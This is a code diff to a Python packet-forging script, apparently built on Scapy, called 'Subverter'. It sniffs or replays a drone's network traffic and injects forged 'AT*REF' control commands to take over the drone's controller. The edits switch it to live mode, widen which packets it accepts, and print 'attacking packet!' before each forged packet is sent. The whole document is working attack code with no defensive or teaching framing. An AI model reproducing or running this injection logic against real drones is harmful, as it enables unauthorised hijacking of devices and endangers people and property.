@@ -15,8 +15,8 @@ DRONE_NET_INTERFACE = 'en1'
 
 # if you want to subvert a local controller set pcap mode to true
 # otherwise, specify a pcap dump here
-PCAP_FILE = 'wsdmp.pcap'
-PCAP_MODE = True
+PCAP_FILE = 'droneTest2.pcap'
+PCAP_MODE = False
 
 # for the subverter instance
 subverter = None
@@ -38,7 +38,7 @@ class Subverter(object):
             and calls a method to search for consecutive probes.
             """
             try:
-                if packet[IP].dst != DRONE_IP and packet[IP].src != DRONE_IP:
+                if packet[IP].dst != DRONE_IP and packet[IP].src != DRONE_IP and packet[IP].src != '6.6.6.6':
                     return
             except Exception:
                 return
@@ -49,7 +49,6 @@ class Subverter(object):
                 return
 
             seqnum = seqnum + 1
-
             load = 'AT*REF=' + str(seqnum) + ',290717696\r'
 
             forged = None
@@ -58,13 +57,10 @@ class Subverter(object):
             except:
                 return
 
-            forged.show2()
             del forged.chksum
             forged = forged.__class__(str(forged))
-            forged.show()
+            print("attacking packet!")
             sendp(forged, iface=DRONE_NET_INTERFACE)
-
-            seqnum += 1
 
         return packetCallback
 
@@ -74,6 +70,7 @@ class Subverter(object):
 
     def pcap_subvert(self):
         """ Begins sniffing with onPacket callback """
+        print('loading pcap file')
         pcap = rdpcap(PCAP_FILE)
         packetCallback = self.onPacket()
         for packet in pcap:
